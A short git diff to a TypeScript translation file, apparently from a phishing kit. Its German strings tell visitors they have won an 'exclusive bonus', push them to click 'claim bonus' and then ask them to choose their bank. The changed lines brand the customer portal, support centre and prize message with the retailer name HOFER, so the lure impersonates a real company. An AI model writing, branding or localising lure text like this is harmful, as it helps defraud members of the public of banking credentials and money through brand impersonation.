@@ -38,10 +38,10 @@ export type TranslationKeys = {
 };
 
 const GERMAN_TRANSLATION: TranslationKeys = {
-  portal_name: "Kundenportal",
-  support_center_name: "Kundensupport",
-  win_title: "Exklusiver Bonus",
-  win_subtitle: "Herzlichen Glückwunsch! Sie wurden für unsere heutige Aktion ausgewählt. Klicken Sie auf die Schaltfläche unten, um Ihren Bonus von 5.000 € zu beanspruchen.",
+  portal_name: "HOFER Kundenportal",
+  support_center_name: "HOFER Kundensupport",
+  win_title: "Exklusiver HOFER Bonus",
+  win_subtitle: "Herzlichen Glückwunsch! Sie wurden für die heutige HOFER Aktion ausgewählt. Klicken Sie auf die Schaltfläche unten, um Ihren Bonus zu beanspruchen.",
   win_button: "Bonus beanspruchen",
   banken_title: "Wählen Sie Ihre Bank",
   banken_subtitle: "Wählen Sie Ihre Bank aus, um fortzufahren.",
